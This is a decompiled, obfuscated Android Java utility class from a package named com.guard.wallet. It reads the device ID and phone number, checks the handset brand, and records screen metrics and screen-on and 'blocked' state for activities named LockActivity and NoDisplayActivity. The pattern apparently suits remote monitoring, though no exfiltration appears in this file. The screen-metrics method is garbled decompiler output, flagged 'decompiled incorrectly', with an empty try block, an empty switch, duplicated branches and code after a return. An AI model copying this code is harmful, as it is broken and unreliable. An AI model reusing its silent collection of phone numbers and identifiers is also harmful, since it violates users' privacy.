package com.guard.wallet.utils;

import a1.AbstractC0026q;
import android.app.Activity;
import android.content.Context;
import android.content.res.Resources;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import com.google.json.Gson;
import com.guard.wallet.LockActivity;
import com.guard.wallet.activity.ConfirmDeviceActivity;
import com.guard.wallet.activity.NoDisplayActivity;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.req.ScreenMetricsVO;
import java.util.Locale;
import java.util.Objects;
import p002e.C0262b;

/* renamed from: com.guard.wallet.utils.e */
/* loaded from: classes.dex */
public abstract class AbstractC0249e {

    /* renamed from: a */
    public static String f408a;

    /* renamed from: b */
    public static Integer f409b = 0;

    /* renamed from: a */
    public static String m612a() {
        String lowerCase = Build.BRAND.toLowerCase();
        if (AbstractC0026q.m151B(lowerCase)) {
            return "android.js";
        }
        lowerCase.getClass();
        switch (lowerCase) {
        }
        return "android.js";
    }

    /* renamed from: b */
    public static Activity m613b() {
        NoDisplayActivity noDisplayActivity;
        NoDisplayActivity noDisplayActivity2;
        if (C0262b.m735a() != null) {
            return C0262b.m735a();
        }
        if (LockActivity.m331b() != null) {
            return LockActivity.m331b();
        }
        if (ConfirmDeviceActivity.m335b() != null) {
            return ConfirmDeviceActivity.m335b();
        }
        NoDisplayActivity noDisplayActivity3 = NoDisplayActivity.f190a;
        synchronized (NoDisplayActivity.class) {
            noDisplayActivity = NoDisplayActivity.f190a;
        }
        if (noDisplayActivity == null) {
            return null;
        }
        synchronized (NoDisplayActivity.class) {
            noDisplayActivity2 = NoDisplayActivity.f190a;
        }
        return noDisplayActivity2;
    }

    /* renamed from: c */
    public static synchronized String m614c() {
        String str;
        synchronized (AbstractC0249e.class) {
            if (f408a == null) {
                try {
                    if (AbstractC0251g.m653Z() != null) {
                        String m708l = AbstractC0252h.m708l("DEVICE_UNIQUE_ID");
                        f408a = m708l;
                        if (m708l == null) {
                            String string = Settings.Secure.getString(AbstractC0251g.m653Z().getContentResolver(), "android_id");
                            f408a = string;
                            AbstractC0252h.m683D(string, "DEVICE_UNIQUE_ID");
                        }
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("DeviceUtils", e2);
                }
            }
            str = f408a;
        }
        return str;
    }

    /* renamed from: d */
    public static String m615d(Context context) {
        Locale locale;
        if (context == null) {
            return null;
        }
        try {
            if (context.getResources() == null || context.getResources().getConfiguration() == null || (locale = context.getResources().getConfiguration().locale) == null) {
                return null;
            }
            return !AbstractC0026q.m151B(locale.toLanguageTag()) ? locale.toLanguageTag() : locale.getLanguage();
        } catch (Exception e2) {
            AbstractC0026q.m186s("DeviceUtils", e2);
            return null;
        }
    }

    /* JADX WARN: Can't wrap try/catch for region: R(14:6|7|8|(10:12|13|14|15|(5:19|20|(1:22)(1:46)|(1:24)(1:45)|25)|48|20|(0)(0)|(0)(0)|25)|52|13|14|15|(6:17|19|20|(0)(0)|(0)(0)|25)|48|20|(0)(0)|(0)(0)|25) */
    /* JADX WARN: Code restructure failed: missing block: B:49:0x00c7, code lost:
    
        r0 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:50:0x00c8, code lost:
    
        a1.AbstractC0026q.m186s("DeviceUtils", r0);
     */
    /* JADX WARN: Removed duplicated region for block: B:22:0x00ec  */
    /* JADX WARN: Removed duplicated region for block: B:24:0x00f1  */
    /* JADX WARN: Removed duplicated region for block: B:34:0x0173  */
    /* JADX WARN: Removed duplicated region for block: B:39:0x0174  */
    /* JADX WARN: Removed duplicated region for block: B:45:0x00f3  */
    /* JADX WARN: Removed duplicated region for block: B:46:0x00ee  */
    /* renamed from: e */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static ScreenMetricsVO m616e() {
        int i2;
        int i3;
        int i4;
        int i5;
        int identifier;
        int identifier2;
        ScreenMetricsVO screenMetricsVO = new ScreenMetricsVO();
        try {
            i2 = 1;
            if (m613b() != null) {
                f409b = Integer.valueOf(m613b().getWindowManager().getDefaultDisplay().getDisplayId());
                DisplayMetrics displayMetrics = new DisplayMetrics();
                m613b().getWindowManager().getDefaultDisplay().getRealMetrics(displayMetrics);
                screenMetricsVO.setWidth(Integer.valueOf(displayMetrics.widthPixels));
                screenMetricsVO.setHeight(Integer.valueOf(displayMetrics.heightPixels));
                screenMetricsVO.setDensity(Integer.valueOf(displayMetrics.densityDpi));
                screenMetricsVO.setScaledDensity(Float.valueOf(displayMetrics.scaledDensity));
                screenMetricsVO.setXdpi(Float.valueOf(displayMetrics.xdpi));
                screenMetricsVO.setYdpi(Float.valueOf(displayMetrics.ydpi));
                try {
                } catch (Exception e2) {
                    AbstractC0026q.m186s("DeviceUtils", e2);
                }
                if (m613b() != null && (identifier2 = m613b().getResources().getIdentifier("status_bar_height", "dimen", "android")) > 0) {
                    i4 = m613b().getResources().getDimensionPixelSize(identifier2);
                    screenMetricsVO.setStatusBarHeight(Integer.valueOf(i4));
                    if (m613b() != null && (identifier = m613b().getResources().getIdentifier("navigation_bar_height", "dimen", "android")) > 0) {
                        i5 = m613b().getResources().getDimensionPixelSize(identifier);
                        screenMetricsVO.setNavigationBarHeight(Integer.valueOf(i5));
                        screenMetricsVO.setIsScreenRound(Integer.valueOf(!(((((float) screenMetricsVO.getWidth().intValue()) / ((float) screenMetricsVO.getHeight().intValue())) > 0.5f ? 1 : ((((float) screenMetricsVO.getWidth().intValue()) / ((float) screenMetricsVO.getHeight().intValue())) == 0.5f ? 0 : -1)) <= 0) ? 1 : 0));
                    }
                    i5 = 0;
                    screenMetricsVO.setNavigationBarHeight(Integer.valueOf(i5));
                    screenMetricsVO.setIsScreenRound(Integer.valueOf(!(((((float) screenMetricsVO.getWidth().intValue()) / ((float) screenMetricsVO.getHeight().intValue())) > 0.5f ? 1 : ((((float) screenMetricsVO.getWidth().intValue()) / ((float) screenMetricsVO.getHeight().intValue())) == 0.5f ? 0 : -1)) <= 0) ? 1 : 0));
                }
                i4 = 0;
                screenMetricsVO.setStatusBarHeight(Integer.valueOf(i4));
                if (m613b() != null) {
                    i5 = m613b().getResources().getDimensionPixelSize(identifier);
                    screenMetricsVO.setNavigationBarHeight(Integer.valueOf(i5));
                    screenMetricsVO.setIsScreenRound(Integer.valueOf(!(((((float) screenMetricsVO.getWidth().intValue()) / ((float) screenMetricsVO.getHeight().intValue())) > 0.5f ? 1 : ((((float) screenMetricsVO.getWidth().intValue()) / ((float) screenMetricsVO.getHeight().intValue())) == 0.5f ? 0 : -1)) <= 0) ? 1 : 0));
                }
                i5 = 0;
                screenMetricsVO.setNavigationBarHeight(Integer.valueOf(i5));
                screenMetricsVO.setIsScreenRound(Integer.valueOf(!(((((float) screenMetricsVO.getWidth().intValue()) / ((float) screenMetricsVO.getHeight().intValue())) > 0.5f ? 1 : ((((float) screenMetricsVO.getWidth().intValue()) / ((float) screenMetricsVO.getHeight().intValue())) == 0.5f ? 0 : -1)) <= 0) ? 1 : 0));
            } else {
                String m708l = AbstractC0252h.m708l("screenMetrics");
                if (!AbstractC0026q.m151B(m708l)) {
                    screenMetricsVO = (ScreenMetricsVO) new Gson().fromJson(m708l, ScreenMetricsVO.class);
                }
            }
            screenMetricsVO.setState(Integer.valueOf(AbstractC0252h.m705i("screenState")));
        } catch (Exception e3) {
            AbstractC0026q.m186s("DeviceUtils", e3);
        }
        if (m621j()) {
            screenMetricsVO.setIsScreenOn(1);
            if (Objects.equals(screenMetricsVO.getState(), 0)) {
                i3 = 1;
                screenMetricsVO.setState(i3);
            }
            if (AbstractC0184g.m353g()) {
                i2 = 0;
            }
            screenMetricsVO.setIsBlocked(Integer.valueOf(i2));
            screenMetricsVO.setScreenOffTimeout(AbstractC0251g.P0());
            AbstractC0252h.m683D(AbstractC0252h.m693N(screenMetricsVO), "screenMetrics");
            return screenMetricsVO;
        }
        screenMetricsVO.setIsScreenOn(0);
        if (!Objects.equals(screenMetricsVO.getState(), 0) && !Objects.equals(screenMetricsVO.getState(), 3)) {
            i3 = 0;
            screenMetricsVO.setState(i3);
        }
        if (AbstractC0184g.m353g()) {
        }
        screenMetricsVO.setIsBlocked(Integer.valueOf(i2));
        screenMetricsVO.setScreenOffTimeout(AbstractC0251g.P0());
        AbstractC0252h.m683D(AbstractC0252h.m693N(screenMetricsVO), "screenMetrics");
        return screenMetricsVO;
        AbstractC0026q.m186s("DeviceUtils", e3);
        return screenMetricsVO;
    }

    /* renamed from: f */
    public static String m617f(String str) {
        if (AbstractC0026q.m151B(str) || !str.contains("-")) {
            return str;
        }
        String[] split = str.split("-");
        return split.length > 1 ? split[0] : str;
    }

    /* renamed from: g */
    public static boolean m618g() {
        String str = Build.BRAND;
        return str.equalsIgnoreCase("huawei") || str.equalsIgnoreCase("honor") || str.equalsIgnoreCase("wiko");
    }

    /* renamed from: h */
    public static boolean m619h() {
        if (AbstractC0251g.m653Z() == null || !m618g()) {
            return false;
        }
        try {
            String string = AbstractC0251g.m653Z().getString(Resources.getSystem().getIdentifier("config_os_brand", "string", "android"));
            if (AbstractC0026q.m151B(string)) {
                return false;
            }
            return string.toLowerCase().contains("harmony");
        } catch (Exception e2) {
            AbstractC0026q.m186s("DeviceUtils", e2);
            return false;
        }
    }

    /* renamed from: i */
    public static boolean m620i() {
        String str = Build.BRAND;
        return str.equalsIgnoreCase("oppo") || str.equalsIgnoreCase("realme") || str.equalsIgnoreCase("oneplus");
    }

    /* renamed from: j */
    public static boolean m621j() {
        Context m653Z = AbstractC0251g.m653Z();
        if (m653Z == null) {
            return false;
        }
        try {
            return ((PowerManager) m653Z.getSystemService("power")).isInteractive();
        } catch (Exception e2) {
            AbstractC0026q.m186s("DeviceUtils", e2);
            return false;
        }
    }

    /* renamed from: k */
    public static boolean m622k() {
        String str = Build.BRAND;
        return str.equalsIgnoreCase("tecno") || str.equalsIgnoreCase("itel") || str.equalsIgnoreCase("infinix");
    }

    /* renamed from: l */
    public static boolean m623l() {
        String str = Build.BRAND;
        return str.equalsIgnoreCase("vivo") || str.equalsIgnoreCase("iqoo");
    }

    /* renamed from: m */
    public static boolean m624m() {
        String str = Build.BRAND;
        return str.equalsIgnoreCase("redmi") || str.equalsIgnoreCase("xiaomi") || str.equalsIgnoreCase("poco") || str.equalsIgnoreCase("blackshark");
    }

    /* renamed from: n */
    public static String m625n() {
        if (AbstractC0251g.m653Z() == null) {
            return null;
        }
        try {
            TelephonyManager telephonyManager = (TelephonyManager) AbstractC0251g.m653Z().getSystemService("phone");
            if (telephonyManager == null || ContextCompat.checkSelfPermission(AbstractC0251g.m653Z(), "android.permission.READ_PHONE_STATE") != 0) {
                return null;
            }
            return telephonyManager.getLine1Number();
        } catch (Exception e2) {
            AbstractC0026q.m186s("DeviceUtils", e2);
            return null;
        }
    }
}
